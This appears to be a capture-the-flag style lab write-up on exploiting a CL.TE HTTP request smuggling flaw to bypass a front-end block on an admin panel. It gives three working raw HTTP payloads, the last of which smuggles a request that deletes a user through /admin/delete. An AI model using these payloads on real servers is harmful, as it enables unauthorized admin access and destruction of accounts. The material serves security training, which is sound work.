# Exploiting HTTP request smuggling to bypass front-end security controls, CL.TE vulnerability

This lab involves a front-end and back-end server, and the front-end server doesn't support chunked encoding. There's an admin panel at /admin, but the front-end server blocks access to it.

To solve the lab, smuggle a request to the back-end server that accesses the admin panel and deletes the user carlos.

Note: Although the lab supports HTTP/2, the intended solution requires techniques that are only possible in HTTP/1. You can manually switch protocols in Burp Repeater from the Request attributes section of the Inspector panel.

Tip: Manually fixing the length fields in request smuggling attacks can be tricky. Our HTTP Request Smuggler Burp extension was designed to help. You can install it via the BApp Store.

We can use a previous payload to find it is possible to redirect to /404:

```
POST / HTTP/1.1
...
Content-Length: 66
Transfer-Encoding: chunked

e
q=smuggling&x=
0

GET /404/ HTTP/1.1
Content-Length: 3

a
```

To access /admin it is necessary to add the header “Host: localhost”:

```
POST / HTTP/1.1
...
Content-Type: application/x-www-form-urlencoded
Content-Length: 113
Transfer-Encoding: chunked

e
q=smuggling&x=
0

GET /admin/ HTTP/1.1
X-Forwarded-For: 127.0.0.1
Host: localhost
Content-Length: 3

a
```

And then delete the user:

```
POST / HTTP/1.1
...
Content-Type: application/x-www-form-urlencoded
Content-Length: 135
Transfer-Encoding: chunked

e
q=smuggling&x=
0

GET /admin/delete?username=carlos HTTP/1.1
X-Forwarded-For: 127.0.0.1
Host: localhost
Content-Length: 3

a
```
